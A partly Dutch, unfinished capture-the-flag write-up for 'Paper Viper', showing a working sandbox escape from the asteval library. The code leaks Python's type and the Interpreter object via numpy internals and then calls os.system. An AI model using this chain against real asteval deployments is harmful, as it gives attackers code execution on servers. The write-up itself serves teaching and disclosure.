# Paper Viper

<img src="chal_descr.png" alt="Challenge description" width="400">

**Author**: Ward  
**Flag**: `kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`  

## Setup
Handout: `chal.py`, `Dockerfile`, `compose.yml`, `getflag.c` and a fake `flag.txt`.

`chal.py` is the main challenge file. The goal of the challenge is to get code execution on the server and run the getflag binary.
In the Dockerfile we find that `numpy` is installed, and `asteval` with version `1.0.6` (which is the latest release).

## The challenge:
The challenge description is a reference to UofTCTF (shout out to SteakEnthusiast), in which there were three challenges on `asteval`, a "safe sandboxing" library for python.
After that CTF a few of the vulnerabilities in the library were fixed, but as anyone familiar with pyjails will know, sandboxing python is very difficult to achieve with the amount of introspection the language has, and things like unpatched memory bugs in cpython. In the case of `asteval`, `numpy` is included by default, which dramatically worsens these issues.

After that CTF I went and did some more research into `asteval` and found a few 0days, some of which I turned into this challenge.

The source code of `chal.py`:
```python
import asteval

# With this many functions from numpy removed there definitely will not be a way for users to get to `type()`, which is a security risk
asteval.astutils.NUMPY_TABLE = {k: asteval.astutils.NUMPY_TABLE[k] for k in ["genfromtxt"]}

def get_input():
    print("Give input, end with a line of $END$")
    inp = ""
    while True:
        temp = input()
        if temp == "$END$":
            break
        inp += temp +"\n"
    return inp

def nope(text):
    if not text.isascii():
        quit("Sorry, only ascii!")
    if any([text.find(x) >= 0 for x in ["yt", "ty", "rm", "uf", "**"]]):
        quit('Sorry, those bigrams just give me bad vibes!')

def main():
    inp = get_input()
    nope(inp)
    asteval.Interpreter().eval(inp, raise_errors=True)

if __name__ == "__main__":
    main()
```

As we can see, the user gives multiline input which is passed through a filter and then evaluated by the `asteval` Interpreter.
With its default settings, `asteval` includes a large set of `numpy` names in the symbol table available from within the sandbox. In this challenge the player is only given a single one of these, the function `genfromtxt()`, with a comment hinting at the function `type()`.

By default, the name `type` available within the sandbox is a "safe version" of it which returns the name of the type as a string.

The filters included are written to prevent some of the easier unintended solutions. There are a lot unpatched vulnerabilities in `asteval`, some of which are quite trivial, which these filters are intended to prevent.

Specifically they are to block:
`byte` and `bytearray`, `dtype`, `type` (the numpy attribute), `ctypes`, `format`, `buffer` and dict unwrapping as a way to pass keyword arguments to functions in a way to bypass text filters (since the dictionary keys are string literals that can be constructed past the filter).

Heel janky library, heleboel bugs en 0days aanwezig. numpy geeft huge attack surface, dus het was best een uitdaging om mensen de juiste richting in te duwen van de intended en de unintendeds te filteren zonder dat het super arbitrair wordt.
Ben ook niet helemaal tevreden door deze filters sinds ze nogal arbitrair zijn, het gaat om de sandbox escape en niet om het bypassen van mijn filters, zoals het geval zou zijn bij e.g. de leuke jailctf pyjails.
TODO uitleggen hoe de challenge tot stand is gekomen / waar de specifieke filters voor zijn:
byte, bytearray, format, buffer, dict unpacking for kwargs which would bypass names that would be filtered otherwise (since strings can be constructed to bypass the filter).

## The solution:
During the CTF there were two solves, by two familiar faces when it comes to pyjails, Lyndon from MMM and oh_word from Infobahn.

Lyndon used a method based on f-strings and the well-known method of using `AttributeError.obj` to extract a value from a format string, which was a variant of a solve for the UofTCTF chals TODO CONTINUE HERE

Lyndon gebruikte een f-string-gebaseerde methode (met de breder bekende methode van AttributeError.obj om een waarde uit een format string te redden) die erg leek op de oplossing van een van de chals voor UofTCTF.
Ik ken de techniek, na UofTCTF is er een patch geweest naar asteval die bedoeld was om het te fixen. Die blijkt niet te werken.
In mijn locale testing-setup werkte het niet (waarschijnlijk omdat ik op een oudere versie van python zat dan op de remote), waardoor ik het niet aan de filters heb toegevoegd.
oh_word heeft de intended route voor `type` gevonden, en daarna memory exploitation gedaan.

### Getting a type primitive:

Uitleg: in de chal wordt hiernaar gehint. Hoe vind je dit?
Wat intelligente searches op type in `numpy`, e.g. als je zoekt op `type(self.` zijn er 4 resultaten, waarvan er maar 2 geen tests zijn.  Meer algemene searches zullen het ook vinden, maar dan heb je wat meer werk in het wegstrepen van routes die niet werken met user-controlled argumenten.
In MaskedArray.count ziet het er zo uit:
```python
        if isinstance(self.data, np.matrix):
            if m is nomask:
                m = np.zeros(self.shape, dtype=np.bool)
            m = m.view(type(self.data))
```
Dit is niet vulnerable: zelfs als de isinstance-check geen probleem zou zijn, dan nog wordt het resultaat van deze call dusdanig gebruikt dat het niet zomaar mogelijk is om bij het resultaat te kunnen.

De andere optie:
```python
def __getitem__(self, indx):
        result = self.dataiter.__getitem__(indx).view(type(self.ma))
        if self.maskiter is not None:
            _mask = self.maskiter.__getitem__(indx)
            if isinstance(_mask, ndarray):
                # set shape to match that of data; this is needed for matrices
                _mask.shape = result.shape
                result._mask = _mask
            elif isinstance(_mask, np.void):
                return mvoid(result, mask=_mask, hardmask=self.ma._hardmask)
            elif _mask:  # Just a scalar, masked
                return masked
        return result
```
De getitem van MaskedIterator. self.ma is user-controlled, self.dataiter is user-controlled. Als we dus ervoor kunnen zorgen dat de .view-methode op dat object uit de dataiter zijn argument returnt, of het in een globale lijst opslaat oid, dan kunnen we direct bij het resultaat van type en hebben we een werkende type primitive.

```python
# Get `type` primitive
def id(x):
    return x

genfromtxt.view = id
ma = genfromtxt(["1"], usemask=True)
mf = ma.flat
mf.maskiter = None
mf.ma = "foo"
mf.dataiter = [genfromtxt]
str = mf[0]

mf.ma = str
t = mf[0]
```

Wat geeft type ons? In de sandbox heb je een fake versie van type. Type stelt ons in staat om class objects te verkrijgen van alle objecten waar we toegang toe hebben in de sandbox, inclusief `asteval`-eigen klassen.

### Overriding class level dunders to leak the interpreter object:

Point out de bug in setattr van dunders.
Point out de bug van setattr in Procedure als instance-level-functie ipv class-level.

```python
# Get Procedure class object
def f():
    pass
p = t(f)

# Obtain the Interpreter instance
def stealer(name, interp, doc=None, lineno=None,
                 body=None, text=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
    print(interp)
    kwargs[0][1].append(interp)
p.__init__ = stealer
rescuelist = []
def g(rescue=rescuelist):
    pass
i = rescuelist[0]
print(i)
```

Dit geeft ons een interpreter-object.

### Profit:
Op dit punt zijn er een heleboel opties.
De makkelijkste is om gewoon gebruik te maken van de importfunctionaliteit.
Een leuke alternatieve optie is om de attribuutnaam-check in on_name te omzeilen door een fake-subtype van string te maken en daarmee de waarde van een ast.Name node te overschrijven, maar die laat is als exercise to the reader.

```python
# Import and escape the jail
i.import_module("os",["sys"],["system"])
sys("echo hi mom")
sys("/getflag")
print()
```

`kalmar{d0nt_play_w1th_5n4kes_if_you_don7_h4ve_gl0v3s}`
